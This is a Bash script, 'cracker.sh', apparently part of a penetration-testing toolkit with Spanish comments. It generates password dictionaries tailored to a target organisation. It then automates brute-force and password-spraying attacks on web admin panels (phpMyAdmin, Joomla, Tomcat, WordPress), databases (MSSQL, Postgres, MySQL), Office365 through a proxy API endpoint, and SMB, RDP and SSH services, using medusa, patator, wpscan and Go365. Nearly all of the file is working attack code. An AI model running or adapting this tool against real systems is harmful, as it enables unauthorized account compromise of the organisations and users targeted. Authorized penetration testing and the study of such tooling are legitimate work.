#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org

OKBLUE='\033[94m'
THREADS="30"
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
LC_TIME=C

# RDP crak

#admin/admin, admin/password                  

echo -e "  ______                  _                         __   ______ "
echo -e " / _____)                | |                       /  | / __   |"
echo -e "| /       ____ ____  ____| |  _ ____  ____    _   /_/ || | //| |"
echo -e "| |      / ___) _  |/ ___) | / ) _  )/ ___)  | | | || || |// | |"
echo -e "| \_____| |  ( ( | ( (___| |< ( (/ /| |       \ V / | ||  /__| |"
echo -e " \______)_|   \_||_|\____)_| \_)____)_|        \_/  |_(_)_____/ "
echo ''
echo '										version 1.1'
echo '									   daniel.torres@owasp.org'
															
echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR ########################################$RESET"



while (( "$#" )); do
  case "$1" in
    --mode)
      MODE=$2 #hacking/total
      shift 2
      ;;
	--speed) #1 -> lento /2-> medio /3-> rapido
      SPEED=$2
      shift 2
      ;;
    --name)
      ENTIDAD=$2
      shift 2
      ;;
	--domain)
      DOMAIN=$2
      shift 2
      ;;
    --idiom)
      LENGUAJE=$2 # en/es
      shift 2
      ;;
    --verbose)
      VERBOSE=$2
      shift 2
      ;;
	--dic)
      DICTIONARY=$2
      shift 2
      ;;
	--extratest)
      EXTRATEST=$2
      shift 2
      ;;
    *)
      echo "Error: Argumento inválido"
      exit 1
  esac
done



tomcat_passwords_combo="/usr/share/lanscanner/tomcat-passwds.txt"
FILE_SUBDOMAINS="importarMaltego/subdominios-scan.csv"
MAX_SCRIPT_INSTANCES=30
MIN_RAM=900
COUNTRY='bolivia'

echo "LENGUAJE $LENGUAJE MODE $MODE ENTIDAD(k) $ENTIDAD DICTIONARY $DICTIONARY EXTRATEST $EXTRATEST VERBOSE:$VERBOSE SPEED $SPEED"
if [[ -z $LENGUAJE ]];then 

cat << "EOF"

Ejecutar el script en el directorio creado por lanscanner (https://github.com/DanielTorres1/lanscanner)

Opciones: 
--name : Nombre de la empresa (Usado para generar diccionario de passwords)
--idiom : idioma es/en
--mode : Mode [hacking/total]	
--verbose : Verbose
--dic :Diccionario de passwords a usar (opcional)
--extratest : oscp

Ejemplo 1: Ataque de diccionario con passwords personallizados (basados en la palabra "microsoft") + 20 passwords mas usados
	cracker.sh --name microsoft --idiom  es

Ejemplo 2: Ataque de diccionario con lista de passwords
	cracker.sh --dic passwords.txt --idiom en
EOF

exit
fi
######################

#rm enumeracion/* 2>/dev/null
#rm .vulnerabilidades/* 2>/dev/null
USERNAMES_FILE="/usr/share/lanscanner/usuarios-top15-$LENGUAJE.txt"

if [ "$LENGUAJE" == "es" ]; then
	admin_user='administrador'
else
	admin_user='administrator'
fi

PASSWORDS_TOP10_FILE="/usr/share/lanscanner/passwords-top10-$LENGUAJE.txt"
PASSWORDS_TOP500_FILE="/usr/share/lanscanner/passwords-top500-$LENGUAJE.txt"

if [ -z $DICTIONARY ] ; then

	if [ ! -z $ENTIDAD ] ; then
		echo "Generando diccionario"
		echo $ENTIDAD > base.txt
		passGen.sh -f base.txt -t online -o online.txt
		passGen.sh -f base.txt -t top10 -o passwords.txt
		
		cat online.txt $PASSWORDS_TOP10_FILE /usr/share/lanscanner/"$COUNTRY".txt | sort | uniq >  passwords.txt
		cat online.txt $PASSWORDS_TOP500_FILE /usr/share/lanscanner/"$COUNTRY".txt | sort | uniq >  passwords-web.txt
	else
		echo "PASSWORDS_FILE $PASSWORDS_FILE"
		cat $PASSWORDS_TOP10_FILE | sort | uniq >  passwords.txt	
		cat $PASSWORDS_TOP500_FILE /usr/share/lanscanner/"$COUNTRY".txt | sort | uniq >  passwords-web.txt		
	fi
	echo "Done Generando"
	echo "wordpress" >> passwords-web.txt		
	echo "joomla" >> passwords-web.txt	
	echo "drupal" >> passwords-web.txt	
else
	cp $DICTIONARY passwords.txt		
fi

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files	
	insert-data.py	
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
	}

#!/bin/bash

check_windows_up() {
    ip=$(echo "$1" | cut -f1 -d":")
    count=$(crackmapexec smb "$ip" -u administrator -p 'testpass' --local-auth | grep '\[-\]' | wc -l)
    if [ "$count" -eq 1 ]; then
        echo "$ip" >> servicios/WindowsAlive.txt
    fi
}
export -f check_windows_up




#  IPs que estén en rdp.txt pero no en Windows.txt (RDP es mas lento, mejor bruteforce SMB)
sort servicios/only_rdp.txt > servicios/rdp_sorted.txt 2>/dev/null
sort servicios/Windows.txt > servicios/Windows_sorted.txt 2>/dev/null
comm -23 servicios/rdp_sorted.txt servicios/Windows_sorted.txt > servicios/only_rdp.txt 2>/dev/null
rm servicios/Windows_sorted.txt 2>/dev/null
#####


find  servicios -size  0 -print0 |xargs -0 rm 2>/dev/null 
echo "Revisar servicios "



if [ -f servicios/admin-web-custom-inserted.txt ]
then	  		  
	echo -e "$OKBLUE\n\t#################### Testing pass web admin ######################$RESET"			
	while IFS= read -r line 
	do
		ip_port_path=`echo $line | cut -d ";" -f 1` #https://200.58.87.208:443/wp-login.php
		fingerprint=`echo $line | cut -d ";" -f 2`
		echo -e "\n\t########### "$ip_port_path #######"	
			
		host_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107  - 190.129.69.107:8080
		proto_http=`echo $ip_port_path | cut -d ":" -f 1`
		if [[ ${host_port} == *":"* ]]; then
			port=`echo $host_port | cut -d ":" -f 2`	
		else
			if [[  ${proto_http} == *"https"* ]]; then
				port="443"
			else
				port="80"
			fi
		fi
		host=`echo $host_port | cut -d ":" -f 1`				
		path_web_sin_slash=`echo $ip_port_path | cut -d "/" -f 4-5 | sed 's/\///g'`	
		path_web=`echo "/"$path_web_sin_slash"/"`

		echo "Buscando company: (.enumeracion2/"$host"_443-_company.txt)"
		if [ -s ".enumeracion2/"$host"_443-_company.txt" ]; then
			echo "generando password personalizados"
			passGen.sh -f ".enumeracion2/"$host"_443-_company.txt" -t online -o passwords-$host.txt
			cat passwords-$host.txt passwords-web.txt > passwords-web-specific.txt
		else
			cat passwords-web.txt > passwords-web-specific.txt
		fi

		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] host = $host port=$port path_web = $path_web " ; fi
		if [ "$VERBOSE" == 's' ]; then  echo -e "fingerprint $fingerprint" ; fi
		
		if [[ $fingerprint = *"phpmyadmin"* ]]; then
			echo -e "\t[+] phpMyAdmin identificado"
			echo "passWeb -proto $proto_http -target $host -port $port -module phpmyadmin -path \"$path_web\" -u root|admin -passfile passwords-web-specific.txt" > logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt 
			passWeb -proto $proto_http -target $host -port $port -module phpmyadmin -path "$path_web" -user root -passfile passwords-web-specific.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt &
			passWeb -proto $proto_http -target $host -port $port -module phpmyadmin -path "$path_web" -user admin -passfile passwords-web-specific.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt &
			passWeb -proto $proto_http -target $host -port $port -module phpmyadmin -path "$path_web" -user mysql -passfile passwords-web-specific.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt &
			for user_ssh in $(cat logs/enumeracion/"$ip"_users.txt 2>/dev/null); do
				echo "Probando usuario: $user_ssh en $ip"
				passWeb -proto $proto_http -target $host -port $port -module phpmyadmin -path "$path_web" -user $user_ssh -passfile passwords-web-specific.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt &
			done

			if [[ "$MODE" == "total" ]] ; then					
				#######  wordpress user ######
				grep -qi wordpress ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_webData.txt"
				greprc=$?
				if [[ $greprc -eq 0 ]];then 
					passWeb -proto $proto_http -target $host -port $port -module phpmyadmin -path "$path_web" -userser wordpress -passfile passwords-web-specific.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt &
				fi

				#######  joomla user ######
				grep -qi joomla ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_webData.txt"
				greprc=$?
				if [[ $greprc -eq 0 ]];then 
					echo "passWeb -proto $proto_http -target $host -port $port -module phpmyadmin -path "$path_web" -userser joomla -passfile passwords-web-specific.txt" >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt
					passWeb -proto $proto_http -target $host -port $port -module phpmyadmin -path "$path_web" -userser joomla -passfile passwords-web-specific.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt &
				fi

				#######  drupal user ######			
				grep -qi drupal ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_webData.txt"
				greprc=$?
				if [[ $greprc -eq 0 ]];then 
					echo "passWeb -proto $proto_http -target $host -port $port -module phpmyadmin -path "$path_web" -userser drupal -passfile passwords-web-specific.txt" >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt
					passWeb -proto $proto_http -target $host -port $port -module phpmyadmin -path "$path_web" -userser drupal -passfile passwords-web-specific.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt&
				fi	
			fi												
		
		fi	
			
		
		if [[ $fingerprint = *"joomla"* ]]; then
			echo -e "\t[+] Joomla identificado"
			echo "passWeb -proto $proto_http -target $host -port $port -module joomla -path \"$path_web\" -u admin -passfile passwords-web-specific.txt" > logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordCMS-joomla.txt 
			passWeb -proto $proto_http -target $host -port $port -module joomla -path "$path_web" -user admin -passfile passwords-web-specific.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordCMS-joomla.txt &		
		fi	

		#echo "fingerprint $fingerprint"	
		echo "line $fingerprint"	
		#if [[ $fingerprint = *'/manager/html'* ]]; then
		if [[ $fingerprint = *'tomcat admin'* ]]; then
			echo -e "\t[+] Tomcat identificado ($ip_port_path)"									
			echo -e "\t\t[+] Testing common passwords"	
			#echo "patator.py http_fuzz url="$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo" 
			patator.py http_fuzz --rate-limit=1 --threads=1 url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordDefecto.txt 2>> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt &
		fi	


		if [[ $fingerprint = *"wordpress"* ]]; then			
			ip_port_path=`echo $ip_port_path |sed 's/wp-login.php//g'`
			path_web_sin_slash=`echo $path_web_sin_slash |sed 's/wp-login.php//g'`
			echo -e "$OKGREEN \t[+] Wordpress identificado en $ip_port_path $RESET"

			grep -i ",$host" $FILE_SUBDOMAINS 2>/dev/null | grep -qi InMotion
    		greprc=$?
    		if [[ $greprc -eq 0 ]];then 
				echo -e "$OKRED \t[+] Hosting InMotion detectado $RESET"
			else
				echo -e "\t[+] Probando contraseñas comunes ...."
				grep -qi "\^" "logs/enumeracion/${host}_${port}-${path_web_sin_slash}_webDataInfo.txt"
				greprc=$?
				if [[ $greprc -eq 0 ]];then
					newdomain=$(cut -d '^' -f3 "logs/enumeracion/${host}_${port}-${path_web_sin_slash}_webDataInfo.txt")
					host=$newdomain
					echo "newdomain $newdomain"
				fi

				if [ -f ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_wpUsers.txt" ]; then
					#https://181.115.188.36:443/				
					for user in $(cat .vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_wpUsers.txt); do
						echo -e "\t\t[+] Probando usuarios identificados. Probando con usuario ($user)"
						echo "wpscan --disable-tls-checks  --random-user-agent  --url $ip_port_path --passwords passwords-web-specific.txt --usernames $user" >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS-wordpress.txt
						wpscan --disable-tls-checks  --random-user-agent --url $ip_port_path --passwords passwords-web-specific.txt --usernames $user >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS-wordpress.txt  2>&1 &
						sleep 10
					done
				else
					echo -e "\t\t[+] Probando con usuario por defecto admin"	
					echo "wpscan --disable-tls-checks  --random-user-agent  --url $ip_port_path --passwords passwords-web-specific.txt --usernames admin" >> logs/cracking/"$host"_admin-"$port"-"$path_web_sin_slash"_passwordCMS-wordpress.txt 2>/dev/null
					#WpCrack.py -t $ip_port_path -u admin --p passwords-web-specific.txt --thread 1 >> logs/cracking/"$host"_"admin-$port"_passwordCMS.txt 2>/dev/null &
					wpscan --disable-tls-checks  --random-user-agent  --url $ip_port_path --passwords passwords-web-specific.txt  --usernames admin >> logs/cracking/"$host"_admin-"$port"-"$path_web_sin_slash"_passwordCMS-wordpress.txt  2>&1 &
				fi						
			fi			
		fi	
	done < servicios/admin-web-custom-inserted.txt			
fi


if [ -f servicios/mssql.txt ]
then
	 echo -e "$OKBLUE\n\t#################### MS-SQL ######################$RESET"	    
	 for line in $(cat servicios/mssql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "[+] Probando $ip:$port"
		echo "medusa -t 1 -f -e ns -u sa -P passwords.txt -h $ip -M mssql -f -t 1 "  >> logs/cracking/"$ip"_1433_passwordBD.txt
		medusa -t 1 -f -e ns -u sa -P passwords.txt -h $ip -M mssql -f -t 1  >> logs/cracking/"$ip"_1433_passwordBD.txt 2>/dev/null &
		
		if [[ "$MODE" == "total" ]] ; then
			echo -e "\n medusa -t 1 -f -e ns -u adm -P passwords.txt -h $ip -M mssql -f -t 1 "  >>  logs/cracking/"$ip"_1433_passwordBD.txt
			medusa -t 1 -f -e ns -u adm -P passwords.txt -h $ip -M mssql -f -t 1 >>  logs/cracking/"$ip"_1433_passwordBD.txt 2>/dev/null &			

			if [[ ! -z $ENTIDAD ]];then
				echo -e "\n medusa -t 1 -f -e ns -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 "  >>  logs/cracking/"$ip"_mongo_passwordBD.txt
				medusa -t 1 -f -e ns -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 >>  logs/cracking/"$ip"_mongo_passwordBD.txt &
			fi
			
		fi		
	 done	
	 insert_data
fi



if [ -f servicios/postgres.txt ]
then
	echo -e "$OKBLUE\n\t#################### postgres ######################$RESET"	    
	 sed -i '1 i\postgres' passwords.txt	#adicionar password postgres
	 for line in $(cat servicios/postgres.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`			
		
		echo -e "[+] Probando $ip"
		echo "medusa -t 1 -f -e ns -u postgres -P passwords.txt -h $ip -M postgres"  >>  logs/cracking/"$ip"_5432_passwordBD.txt
		medusa -t 1 -f -e ns -u postgres -P passwords.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null &
		
		echo -e "\n medusa -t 1 -f -e ns -u pgsql -P passwords.txt -h $ip -M postgres"  >>  logs/cracking/"$ip"_5432_passwordBD.txt
		medusa -t 1 -f -e ns -u pgsql -P passwords.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null &
		
		if [ -z "$ENTIDAD" ]; then
			echo -e "\nmedusa -t 1 -f -e ns -u $ENTIDAD -P passwords.txt -h $ip -M postgres"  >>  logs/cracking/"$ip"_5432_passwordBD.txt
			medusa -t 1 -f -e ns -u $ENTIDAD -P passwords.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt &
		fi		
		
	 done	
	 insert_data
fi



if [ -f servicios/mysql.txt ]
then       	
	echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL ######################$RESET"	
	sed -i '1 i\mysql' passwords.txt	#adicionar password mysql
	for line in $(cat servicios/mysql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Probando $ip"
		hostlive=`mysql -u mysql -pww $ip`				
		#error
		if [[ ${hostlive} == *"MySQL server through socket"*  ]];then   	  
			echo "El servicio no esta funcionando correctamente"
							
		else
			#user root
			echo -e "\n medusa -t 1 -f -e ns -u root -P passwords.txt -h $ip -M mysql "  >>  logs/cracking/"$ip"_3306_passwordBD.txt 
			medusa -t 1 -f -e ns -u root -P passwords.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &
			
			#user mysql
			echo -e "\n medusa -t 1 -f -e ns -u mysql -P passwords.txt -h $ip -M mysql"  >> logs/cracking/"$ip"_3306_passwordBD.txt
			medusa -t 1 -f -e ns -u mysql -P passwords.txt -h $ip -M mysql >> logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &
			
			if [[ "$MODE" == "total" ]] ; then
				# user mysql
				echo -e "\n medusa -t 1 -f -e ns -u admin -P passwords.txt -h $ip -M mysql " >>  logs/cracking/"$ip"_3306_passwordBD.txt
				medusa -t 1 -f -e ns -u admin -P passwords.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &
				
				#administrador/administrator
				echo -e "\n medusa -t 1 -f -e ns -u $admin_user -P passwords.txt -h $ip -M mysql " >>  logs/cracking/"$ip"_3306_passwordBD.txt				
				medusa -t 1 -f -e ns -u $admin_user -P passwords.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &		
				
				if [[ ! -z $ENTIDAD ]];then
					echo -e "\n medusa -t 1 -f -e ns -u $ENTIDAD  -P passwords.txt -h $ip -M mysql " >>  logs/cracking/"$ip"_3306_passwordBD.txt				
					medusa -t 1 -f -e ns -u $ENTIDAD  -P passwords.txt -h $ip -M mysql  >>  logs/cracking/"$ip"_3306_passwordBD.txt	&
				fi
				
			fi			
		fi				
	done
	insert_data			
fi


if [ -f .enumeracion2/"$DOMAIN"_office365_users.txt ]
then		
	echo -e "[+] Probando Office365 passwords"

	while IFS= read -r line; do
		# Obtiene el nombre de usuario del correo electrónico
		username=$(echo "$line" | awk -F '@' '{print $1}')
		# Escribe el correo y el nombre de usuario en el formato deseado en el nuevo archivo
		echo "$line:$username" >> correo_password.txt
	done < .enumeracion2/"$DOMAIN"_office365_users.txt

	Go365 -endpoint rst -up correo_password.txt -d $DOMAIN -url https://0ph9tvyrja.execute-api.us-east-1.amazonaws.com/post/rst2.srf | tee -a  logs/cracking/correo_office365_passwordAdivinadoUser.txt
	Go365 -endpoint rst -ul .enumeracion2/"$DOMAIN"_office365_users.txt -pl passwords.txt -d $DOMAIN -url https://0ph9tvyrja.execute-api.us-east-1.amazonaws.com/post/rst2.srf | tee -a  logs/cracking/correo_office365_passwordAdivinadoUser.txt
	grep 'valid login' logs/cracking/correo_office365_passwordAdivinadoUser.txt  > .vulnerabilidades/correo_office365_passwordAdivinadoUser.txt	
		
fi
### Windows
# check up, check false positive and save servicios/WindowsAlive.txt
cat servicios/Windows.txt 2>/dev/null| xargs -I {} -P 10 bash -c 'check_windows_up "$@"' _ {}

if [ -f servicios/WindowsAlive.txt ]
then		
	echo -e "$OKBLUE\n\t#################### Testing windows auth ######################$RESET"			
	# for password in $(cat passwords.txt); do
	# 	#probar todos los host con $password
	# 	local-admin-checker.sh -u $admin_user -p "$password" -f servicios/WindowsAlive.txt
	# done


	for line in $(cat servicios/WindowsAlive.txt); do
		ip=`echo $line | cut -f1 -d":"`			
		grep -iq 'allows sessions using username' .vulnerabilidades2/"$ip"_445_nullsession.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then	
			echo -e "[+] Null session detectada en $ip"
		else
			echo -e "[+] Probando $ip"
			while true; do			
				free_ram=`free -m | grep -i mem | awk '{print $7}'`		
				script_instancias=$((`ps aux | egrep 'patator|medusa|ncrack' | wc -l` - 1)) 			
				
				if [[ $free_ram -gt $MIN_RAM && $script_instancias -lt $MAX_SCRIPT_INSTANCES  ]];then 										
					echo "patator smb_login -t 1 host=$ip user=$admin_user password=FILE0 0=passwords.txt -x quit:code=0  -R logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt " > logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt
					patator smb_login -t 1 host=$ip user=$admin_user password=FILE0 0=passwords.txt -x quit:code=0  -R logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt 2> /dev/null &
					
					if [[ "$MODE" == "total" && "$EXTRATEST" == "oscp"  ]]; then 
						if [ "$LENGUAJE" == "es" ]; then
							echo "patator smb_login host=$ip user=soporte password=FILE0 0=passwords.txt -x quit:code=0 " >> logs/cracking/"$ip"_soporte-windows_passwordAdivinadoWin.txt 
							patator smb_login -t 1 host=$ip user=soporte password=FILE0 0=passwords.txt -x quit:code=0  -R logs/cracking/"$ip"_soporte-windows_passwordAdivinadoWin.txt 2>> /dev/null &

							
							echo "patator smb_login host=$ip user=sistemas password=FILE0 0=passwords.txt -x quit:code=0 " >> logs/cracking/"$ip"_sistemas-windows_passwordAdivinadoWin.txt 
							patator smb_login -t 1 host=$ip user=sistemas password=FILE0 0=passwords.txt -x quit:code=0  -R logs/cracking/"$ip"_sistemas-windows_passwordAdivinadoWin.txt 2>> /dev/null &
						fi	

						if [[ ! -z $ENTIDAD ]];then
							echo "patator smb_login host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt -x quit:code=0 " > logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt
							patator smb_login -t 1 host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt -x quit:code=0  -R logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt 2> /dev/null &
						fi			
					fi					
					sleep 1
					break					
				else								
					script_instancias=`ps aux | egrep 'patator|medusa|ncrack' | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E'| wc -l`
					echo -e "\t[-] Scripts online ($script_instancias) RAM = $free_ram Mb "
					sleep 3										
				fi		
			done # while true			
		fi # no null session		
	done	
fi


if [ -f servicios/only_rdp.txt ]; then	

	echo -e "$OKBLUE\n\t#################### RDP ######################$RESET"	    
	for line in $(cat servicios/only_rdp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Probando $ip:$port"

		while true; do			
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			script_instancias=$((`ps aux | egrep 'patator|medusa|ncrack' | wc -l` - 1)) 			
			
			if [[ $free_ram -gt $MIN_RAM && $script_instancias -lt $MAX_SCRIPT_INSTANCES  ]];then 					
				####### user administrador/administrator ####
				echo "admin_user $admin_user"
				patator.py rdp_login --rate-limit=1 --threads=1 host=$ip user=$admin_user password=FILE0 0=passwords.txt -x quit:egrep='OK|PASSWORD_EXPIRED|ERRCONNECT_CONNECT_CANCELLED|ERRCONNECT_TLS_CONNECT_FAILED' 2> logs/cracking/"$ip"_3389_passwordAdivinadoWin2-"$admin_user".txt &
				
				##############################

				if [[ ! -z $ENTIDAD ]] ;then	
					####### user $ENTIDAD ####
					echo ""
					patator.py rdp_login --rate-limit=1 --threads=1 host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt -x quit:egrep='OK|PASSWORD_EXPIRED|ERRCONNECT_CONNECT_CANCELLED|ERRCONNECT_TLS_CONNECT_FAILED'  2>> logs/cracking/"$ip"_3389_passwordAdivinadoWin2-"$ENTIDAD".txt &
					##############################
				fi			
				break
			else								
				script_instancias=`ps aux | egrep 'patator|medusa|ncrack' | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E'| wc -l`
				echo -e "\t[-] Scripts online ($script_instancias) RAM = $free_ram Mb "
				sleep 3										
			fi		
		done # while true

	 done	
	 insert_data

fi


### SSH #########
if [ -f servicios/ssh.txt ]
then	
	echo -e "$OKBLUE\n\t#################### Testing pass SSH ######################$RESET"	
	for line in $(cat servicios/ssh.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+]IP: $ip" 

		if [[ ! -z $ENTIDAD ]];then
			echo -e "\t[+]Probando usuario: $ENTIDAD" 
			medusa -t 1 -f -u $ENTIDAD -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
		fi

		for user_ssh in $(cat logs/enumeracion/"$ip"_users.txt 2>/dev/null); do
			echo -e "\t[+]Probando usuario: $user_ssh en $ip"
			medusa -t 1 -f -u $user_ssh -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
		done
				
		echo -e "\t[+]Probando usuario: root"								
		medusa -t 1 -f -u root -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
	done	
fi





	#patator.py http_fuzz method=GET url=$line user_pass=manager:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 > logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat2.txt 2>> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat2.txt
	#si encontro el password
#				egrep -iq "200 OK" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat2.txt
	#greprc=$?
	#if [[ $greprc -eq 0 ]] ; then			
		#echo -e "\t[i] Password encontrado"
		## 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
		#password=`grep --color=never "200 OK" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
		#echo "$line (Usuario:manager Password:$password)" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passTomcat.txt								
	#fi
	
	#patator.py http_fuzz method=GET url=$line user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 > logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat3.txt 2>> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat3.txt
	#si encontro el password
	#egrep -iq "200 OK" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat3.txt
	#greprc=$?
	#if [[ $greprc -eq 0 ]] ; then			
		#echo -e "\t[i] Password encontrado"
		## 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
		#password=`grep --color=never "200 OK" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
		#echo "$line (Usuario:root Password:$password)" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passTomcat.txt								
	#fi		


# if [ -f servicios/pptp.txt ]
# then
# 	echo -e "$OKBLUE #################### pptp (`wc -l servicios/pptp.txt`) ######################$RESET"
# 	for line in $(cat servicios/pptp.txt); do
# 		ip=`echo $line | cut -f1 -d":"`
# 		port=`echo $line | cut -f2 -d":"`		
# 		echo -e "[+] Escaneando $ip"
# 		touch pass.txt
# 		echo "thc-pptp-bruter -u 'hn_csm' -n 4 $ip < pass.txt"  > logs/enumeracion/"$ip"_pptp_hostname.txt 2>/dev/null 
# 		thc-pptp-bruter -u 'hn_csm' -n 4 $ip < pass.txt  >> logs/enumeracion/"$ip"_pptp_hostname.txt 2>/dev/null 
# 		grep "Hostname" logs/enumeracion/"$ip"_pptp_hostname.txt > .enumeracion/"$ip"_pptp_hostname.txt
# 		rm pass.txt
# 	done
# fi

# if [ -f servicios/oracle.txt ]
# then
# 	echo -e "\n\t $OKBLUE Encontre servicios oracle activos. $RESET"	   
	
# 	#https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573  	
				
# 		export SQLPATH=/opt/oracle/instantclient_18_3
# 		export TNS_ADMIN=/opt/oracle/instantclient_18_3
# 		export LD_LIBRARY_PATH=/opt/oracle/instantclient_18_3
# 		export ORACLE_HOME=/opt/oracle/instantclient_18_3

# 	 echo -e "$OKBLUE\n\t#################### oracle ######################$RESET"	    
# 	 for line in $(cat servicios/oracle.txt); do
# 		ip=`echo $line | cut -f1 -d":"`
# 		port=`echo $line | cut -f2 -d":"`
		
# 		echo -e "[+] Probando $ip"
# 		msfconsole -x "use auxiliary/admin/oracle/oracle_login;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_oracle_passwordBD.txt 2>/dev/null
# 		egrep --color=never 'Found' logs/vulnerabilidades/"$ip"_oracle_passwordBD.txt | tee -a .vulnerabilidades/"$ip"_oracle_passwordBD.txt

# 		SIDS=`grep '|' logs/vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_oracleSids.txt | grep -v oracle-sid-brute | awk '{print $2}'`
		
# 		for SID in $SIDS; do
# 			echo -e "[+] Probando SID $SID"
# 			odat.sh passwordguesser -s $ip -p 1521 -d $SID --accounts-file /usr/share/wordlists/oracle_default_userpass.txt >> logs/vulnerabilidades/"$ip"_oracle_passwordBD.txt 
# 		done		
		
# 	 done	
# 	 insert_data
# fi

# if [ -f servicios/mongoDB.txt ]
# then
# 	echo -e "$OKBLUE #################### MongoDB (`wc -l servicios/mongoDB.txt`) ######################$RESET"
# 	for line in $(cat servicios/mongoDB.txt); do
# 		ip=`echo $line | cut -f1 -d":"`
# 		port=`echo $line | cut -f2 -d":"`		
# 		echo -e "[+] Escaneando $ip:$port"
